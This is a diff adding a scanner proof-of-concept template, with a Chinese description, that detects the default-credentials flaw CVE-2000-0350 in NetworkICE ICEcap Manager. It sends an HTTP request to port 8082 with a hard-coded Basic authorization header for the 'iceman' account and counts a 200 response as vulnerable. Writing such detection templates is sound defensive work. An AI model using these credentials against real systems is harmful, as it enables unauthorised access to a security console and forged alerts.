@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "检测 NetworkICE ICEcap Manager 2.0.23 及更早版本是否存在默认凭据漏洞。ICEcap Manager 默认监听 8082 端口，管理账号 iceman 密码为空（编码为 %3B7%C6%FE），远程攻击者可利用该默认凭据登录管理控制台并发送伪造告警事件。"
+id = "POC-AVE-2000-0304"
+name = "NetworkICE ICEcap Manager 默认凭据认证绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0350",
+    "default-credentials",
+    "icecap",
+]
+vuln_id = [
+    "CVE-2000-0350",
+    "AVE-2000-0304",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+port = 8082
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic aWNlbWFuOiUzQjclQzYlRkU="
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
